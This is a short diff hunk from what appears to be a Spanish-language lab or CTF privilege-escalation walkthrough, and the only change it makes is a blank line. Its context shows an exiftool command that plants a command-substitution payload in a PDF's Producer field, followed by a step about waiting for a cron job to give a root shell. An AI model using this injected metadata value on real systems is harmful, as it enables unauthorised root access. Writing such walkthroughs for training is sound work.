@@ -471,6 +471,7 @@ Ahora pasos a seguir
 
 exiftool -Producer='a[$(/dev/shm/script.sh)]+dompdf' ./tu_archivp.pdf		
 ```
+
 5. Esperar a que la tarea cron se ejecute y cuando pase tendremos en nuestra maquina una shell de la maquina victima como root.
 
 	
